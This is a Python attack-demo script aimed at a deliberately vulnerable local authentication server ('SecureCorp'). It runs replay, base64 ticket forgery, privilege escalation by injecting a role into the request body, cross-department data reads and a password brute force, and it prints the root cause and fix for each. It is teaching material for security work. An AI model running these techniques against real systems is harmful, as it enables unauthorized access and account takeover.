
import sys
import json
import time
import uuid
import base64
import requests

BASE = "http://localhost:5000"

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner(n, title):
    bar = "═" * 64
    print(f"\n{BOLD}{CYAN}{bar}\n  ATTACK {n} — {title}\n{bar}{RESET}")

def vuln(msg):  print(f"  {RED}[VULN]  {msg}{RESET}")
def info(msg):  print(f"  {YELLOW}[INFO]  {msg}{RESET}")
def step(msg):  print(f"\n  {BOLD}» {msg}{RESET}")
def show(k, v): print(f"     {CYAN}{k:<32}{RESET}{v}")
def boom(msg):  print(f"\n  {BOLD}{RED}💥 EXPLOITED: {msg}{RESET}")
def safe(msg):  print(f"\n  {BOLD}{GREEN}✓  BLOCKED:   {msg}{RESET}")


def login(username, password):
    r = requests.post(f"{BASE}/login",
                      json={"username": username, "password": password})
    if not r.ok:
        print(f"{RED}  Login failed for {username}: {r.json()}{RESET}")
        sys.exit(1)
    return r.json()


def get_ticket(tgt, nonce=None, ts=None):
    return requests.post(f"{BASE}/request-ticket", json={
        "tgt": tgt,
        "service": "resource_server",
        "authenticator": {
            "nonce":     nonce or str(uuid.uuid4()),
            "timestamp": ts    or time.time(),
        },
    })


def auth_headers(service_ticket, extra=None):
    h = {
        "X-Service-Ticket":          service_ticket,
        "X-Authenticator-Nonce":     str(uuid.uuid4()),
        "X-Authenticator-Timestamp": str(time.time()),
        "X-Hour-Override":           "10",
    }
    if extra:
        h.update(extra)
    return h


def forge_ticket(token, overrides):
    """Decode base64 ticket, apply overrides, re-encode. No HMAC to break."""
    pad = 4 - len(token) % 4
    raw = base64.urlsafe_b64decode((token + ("=" * pad if pad != 4 else "")).encode())
    data = json.loads(raw)
    data.update(overrides)
    return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).decode()


def decode_ticket(token):
    pad = 4 - len(token) % 4
    raw = base64.urlsafe_b64decode((token + ("=" * pad if pad != 4 else "")).encode())
    return json.loads(raw)


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 1 — REPLAY ATTACK
# ═══════════════════════════════════════════════════════════════════════════════

def attack_1_replay():
    banner(1, "REPLAY ATTACK")

    vuln("ReplayProtection.check_and_register() always returns True.")
    vuln("Nonces are never stored. The same authenticator token can be replayed forever.")

    step("Step 1: bob makes a legitimate TGS exchange — capture nonce + timestamp")
    auth      = login("bob", "Manager@2024")
    nonce     = str(uuid.uuid4())
    timestamp = time.time()

    r1 = get_ticket(auth["tgt"], nonce=nonce, ts=timestamp)
    show("Captured nonce:",        nonce[:18] + "...")
    show("Legitimate response:",   f"HTTP {r1.status_code} — ticket issued")

    step("Step 2: Attacker replays the identical nonce + timestamp 3 times")
    all_ok = True
    for attempt in range(1, 4):
        r = get_ticket(auth["tgt"], nonce=nonce, ts=timestamp)
        label = f"ticket issued ← EXPLOIT #{attempt}" if r.ok else "BLOCKED"
        show(f"Replay attempt {attempt}:", f"HTTP {r.status_code} — {label}")
        if not r.ok:
            all_ok = False

    if all_ok:
        boom("Replayed authenticator accepted every time — attacker gains unlimited service tickets")
    else:
        safe("Replay blocked")

    step("Root Cause")
    info("security.py → check_and_register(): returns True unconditionally.")
    info("Fix: store nonce + expiry in a dict; reject duplicates within the time window.")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 2 — TICKET TAMPERING
# ═══════════════════════════════════════════════════════════════════════════════

def attack_2_tampering():
    banner(2, "TICKET TAMPERING")

    vuln("Tickets are plain base64(JSON) — no encryption, no HMAC signature.")
    vuln("An attacker decodes, edits any field, re-encodes, and the server accepts it.")

    step("Step 1: carol (Employee/HR/public) gets a legitimate service ticket")
    auth  = login("carol", "Employee@2024")
    token = get_ticket(auth["tgt"]).json()["service_ticket"]
    orig  = decode_ticket(token)
    show("Original role:",       orig["role"])
    show("Original clearance:",  orig["clearance"])
    show("Original department:", orig["department"])

    step("Step 2: Attacker decodes ticket, flips role → Admin + dept → IT")
    forged = forge_ticket(token, {"role": "Admin", "clearance": "secret", "department": "IT"})
    fdata  = decode_ticket(forged)
    show("Forged role:",       fdata["role"])
    show("Forged clearance:",  fdata["clearance"])
    show("Forged department:", fdata["department"])

    step("Step 3: Attacker uses forged ticket to DELETE IT-001 (secret IT resource)")
    info("carol's real ticket: wrong role, wrong dept, wrong clearance — should be impossible")
    r = requests.delete(f"{BASE}/resource/IT-001", headers=auth_headers(forged))
    show("DELETE /resource/IT-001:", f"HTTP {r.status_code}")

    if r.ok:
        boom("Forged ticket accepted — Employee became Admin and deleted a secret IT resource")
    else:
        safe(f"Forged ticket rejected: {r.json().get('reason', '')}")

    step("Root Cause")
    info("security.py → encrypt_ticket() uses base64 only; key is ignored.")
    info("Fix: use Fernet (AES-128-CBC + HMAC-SHA256). Any modification")
    info("invalidates the MAC → InvalidToken raised before any data is read.")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 3 — PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════════════════════

def attack_3_privilege_escalation():
    banner(3, "PRIVILEGE ESCALATION — Request Body Injection")

    vuln("app.py → require_ticket() reads body['role'] and overwrites ticket['role'].")
    vuln("Any user can self-promote by sending {\"role\": \"Admin\"} in the JSON body.")

    step("Step 1: carol (Employee) gets a valid service ticket")
    auth  = login("carol", "Employee@2024")
    token = get_ticket(auth["tgt"]).json()["service_ticket"]
    show("Ticket role:", "Employee  (read-only — no write, no delete)")

    step("Step 2: carol tries DELETE with her real Employee ticket → 403")
    r_real = requests.delete(f"{BASE}/resource/HR-001", headers=auth_headers(token))
    show("DELETE real Employee ticket:", f"HTTP {r_real.status_code} — {'denied as expected' if r_real.status_code == 403 else 'unexpected!'}")

    step("Step 3: carol injects {\"role\": \"Admin\"} in the request body → 200")
    r_esc = requests.delete(
        f"{BASE}/resource/HR-001",
        headers=auth_headers(token, extra={"Content-Type": "application/json"}),
        json={"role": "Admin", "clearance": "secret"},
    )
    show("DELETE + injected role=Admin:", f"HTTP {r_esc.status_code}")

    if r_esc.ok:
        boom("Employee escalated to Admin via request body — HR-001 deleted without authorization")
    else:
        safe(f"Escalation blocked: {r_esc.json().get('reason', '')}")

    step("Root Cause")
    info("app.py → require_ticket(): `if 'role' in body: ticket['role'] = body['role']`")
    info("Fix: remove those lines entirely. Authorization attributes must come")
    info("exclusively from the verified, HMAC-signed ticket — never from client input.")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 4 — UNAUTHORIZED CROSS-DEPARTMENT ACCESS
# ═══════════════════════════════════════════════════════════════════════════════

def attack_4_cross_dept():
    banner(4, "UNAUTHORIZED CROSS-DEPARTMENT ACCESS")

    vuln("pdp.py → POL-001 (Department Isolation) and POL-002 (Clearance) handlers removed.")
    vuln("Any authenticated user can read any department's resources regardless of classification.")

    step("Step 1: carol (Employee / HR / public clearance) gets a ticket")
    auth  = login("carol", "Employee@2024")
    token = get_ticket(auth["tgt"]).json()["service_ticket"]
    show("carol's department:", "HR")
    show("carol's clearance:",  "public")

    step("Step 2: carol reads Finance and IT resources")
    targets = [
        ("FIN-002", "Finance", "confidential"),
        ("FIN-001", "Finance", "secret"),
        ("IT-001",  "IT",      "secret"),
        ("OPS-001", "Operations", "confidential"),
    ]
    any_exploited = False
    for rid, dept, cls in targets:
        r = requests.get(f"{BASE}/resource/{rid}", headers=auth_headers(token))
        exploited = r.ok
        any_exploited = any_exploited or exploited
        show(f"GET /resource/{rid} ({dept}/{cls}):",
             f"HTTP {r.status_code} — {'DATA RETURNED ← EXPLOIT' if exploited else 'BLOCKED'}")
        if exploited:
            info(f"  Leaked: {r.json().get('data', '')[:60]}...")

    if any_exploited:
        boom("HR Employee read Finance, IT, and Operations data — no department boundary enforced")
    else:
        safe("Cross-dept access blocked")

    step("Root Cause")
    info("pdp.py → _evaluate_policy(): POL-001 and POL-002 not in handlers dict.")
    info("Fix: restore _pol_department_isolation() and _pol_clearance() and")
    info("add them back to the handlers dict: {'POL-001': ..., 'POL-002': ...}")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK 5 — BRUTE FORCE
# ═══════════════════════════════════════════════════════════════════════════════

def attack_5_brute_force():
    banner(5, "BRUTE FORCE — No Rate Limiting / Account Lockout")

    vuln("rate_limiter.py → RateLimiter is a stub class.")
    vuln("is_ip_blocked() and is_account_locked() always return (False, '').")
    vuln("record_attempt() is a no-op. Unlimited password attempts are allowed.")

    wordlist = [
        "password", "123456", "frank123", "SecureCorp1", "letmein",
        "admin", "qwerty", "Password1!", "securecorp", "Frank",
    ]

    step(f"Sending {len(wordlist)} wrong passwords for 'frank' — expect no lockout")
    locked = False
    for i, pwd in enumerate(wordlist, 1):
        r = requests.post(f"{BASE}/login",
                          json={"username": "frank", "password": pwd})
        if r.status_code == 429:
            locked = True
            show(f"Attempt {i:>2}:", f"HTTP {r.status_code} — ACCOUNT LOCKED")
            break
        show(f"Attempt {i:>2} ({pwd:<16}):", f"HTTP {r.status_code} — wrong password, no lockout")

    step("Trying the real password after all failures")
    r_real = requests.post(f"{BASE}/login",
                           json={"username": "frank", "password": "Frank@2024"})
    show("Real password (Frank@2024):",
         f"HTTP {r_real.status_code} — {'LOGIN SUCCESS ← EXPLOIT' if r_real.ok else 'BLOCKED'}")

    if not locked and r_real.ok:
        boom(f"{len(wordlist)} failed attempts caused no lockout — attacker can run unlimited dictionary attacks")
    else:
        safe("Account locked after consecutive failures")

    step("Root Cause")
    info("rate_limiter.py → all RateLimiter methods are stubs returning safe defaults.")
    info("Fix: restore is_account_locked() to check failure count >= 5,")
    info("and record_attempt() to increment counters and set lockout expiry.")


# ═══════════════════════════════════════════════════════════════════════════════
# SUMMARY TABLE
# ═══════════════════════════════════════════════════════════════════════════════

def summary():
    print(f"\n{BOLD}{'═'*64}")
    print("  VULNERABILITY SUMMARY")
    print(f"{'═'*64}{RESET}")
    rows = [
        ("1", "Replay Attack",         "security.py",     "check_and_register() always True"),
        ("2", "Ticket Tampering",      "security.py",     "base64 JSON — no HMAC"),
        ("3", "Privilege Escalation",  "app.py",          "role overridden from body"),
        ("4", "Cross-Dept Access",     "pdp.py",          "POL-001 & POL-002 removed"),
        ("5", "Brute Force",           "rate_limiter.py", "all checks disabled (stub)"),
    ]
    for n, attack, file_, cause in rows:
        print(f"  {RED}[{n}]{RESET}  {BOLD}{attack:<26}{RESET}"
              f"  {CYAN}{file_:<18}{RESET}  {cause}")
    print(f"\n  {YELLOW}Replace these 4 files with the secure versions to fix all issues.{RESET}")
    print(f"{'═'*64}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print(f"\n{BOLD}{'═'*64}")
    print("  SecureCorp — VULNERABLE BUILD — Attack Demo Suite")
    print(f"  Target: {BASE}")
    print(f"{'═'*64}{RESET}")

    try:
        h = requests.get(f"{BASE}/health", timeout=3)
        build = h.json().get("version", "?")
        note = f"  {GREEN}Server OK{RESET} — {h.json().get('system', '')}"
        if "vulnerable" not in build:
            note += f"  {YELLOW}(warning: may be the SECURE build){RESET}"
        print(note)
    except requests.ConnectionError:
        print(f"{RED}  Cannot connect to {BASE} — run: python app.py{RESET}")
        sys.exit(1)

    for fn in [
        attack_1_replay,
        attack_2_tampering,
        attack_3_privilege_escalation,
        attack_4_cross_dept,
        attack_5_brute_force,
    ]:
        try:
            fn()
        except requests.ConnectionError:
            print(f"\n{RED}  Server went away — is app.py still running?{RESET}")
            sys.exit(1)
        except Exception as exc:
            import traceback
            print(f"\n{RED}  Error in {fn.__name__}: {exc}{RESET}")
            traceback.print_exc()

    summary()
